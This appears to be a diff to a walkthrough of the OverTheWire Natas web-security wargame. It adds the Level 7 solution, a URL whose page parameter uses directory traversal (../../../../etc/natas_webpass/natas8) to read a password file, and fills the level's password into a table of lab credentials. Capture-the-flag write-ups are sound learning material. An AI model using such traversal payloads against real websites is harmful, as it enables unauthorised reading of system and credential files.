@@ -28,8 +28,8 @@ if we analize the code of the website, we can see that the secret that we need i
 The password is: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 
 # Level 7
-
-
+We can find the password under: hxxp://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 # Level 8
 
 
@@ -98,7 +98,7 @@ The password is: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 | Level 5  | natas5  | iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq |
 | Level 6  | natas6  | aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 |
 | Level 7  | natas7  | 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 |
-| Level 8  | natas8  |  |
+| Level 8  | natas8  | DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe |
 | Level 9  | natas9  |  |
 | Level 10 | natas10 |  |
 | Level 11 | natas11 |  |
